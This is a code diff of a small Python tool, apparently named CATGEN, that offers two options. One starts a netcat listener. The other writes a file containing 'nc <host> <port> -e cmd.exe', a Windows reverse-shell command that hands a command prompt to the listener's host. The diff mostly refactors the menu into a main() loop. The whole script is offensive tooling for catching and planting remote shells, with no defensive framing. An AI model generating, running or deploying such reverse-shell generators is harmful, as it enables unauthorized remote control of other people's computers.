@@ -1,6 +1,7 @@
 import os
 import time
 import subprocess
+from subprocess import Popen,PIPE
 
 print("""\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄████ ▓█████  ███▄    █ 
 ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒ ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
@@ -21,18 +22,30 @@ bandaid = '-e cmd.exe' #lol
 time.sleep(1)
 print("Select an option... \n\n")
 time.sleep(1)
-beginning = input("1. Start a netcat listener (1) \n2. Generate a netcat file for Windows (2): \n\n")
-if beginning == '1':
-    try: 
-        print("Starting listener and waiting for a connection...\n")
-        subprocess.check_output(
-        'nc -lnvp' + str(ncport) , shell=True
-    ).splitlines()
-    except subprocess.CalledProcessError:
-        print("An error was detected, maybe the port is used?")
-        exit()
-if beginning == '2':
-    nameoffile = input("What do you want the name of your file to be? ") 
-    with open(nameoffile, 'w') as f:
-        f.write('nc' + ' ' +  str(nchost) + ' ' + str(ncport) + ' ' + bandaid)
-    print("%s created." % (nameoffile))
+def main():
+    while True:
+        beginning = input(
+            "1. Start a netcat listener (1) \n2. Generate a netcat file for Windows (2): \n\n"
+            )
+        if beginning == '1':
+            try: 
+                print("Starting listener and waiting for a connection...\n")
+                cmd = subprocess.check_output(
+                   'nc -lnvp' + str(ncport), shell=True
+                    ).splitlines()
+                return (cmd)
+            except subprocess.CalledProcessError:
+                print("Disconnected!")
+                exit()
+        elif beginning == '2':
+            nameoffile = input(
+                "What do you want the name of your file to be? "
+                ) 
+            with open(nameoffile, 'w') as f:
+                f.write(f"nc {nchost} {ncport} {bandaid}")
+            print(f"{nameoffile} created.")
+            return (nameoffile)
+            break
+        else:
+            break
+main()
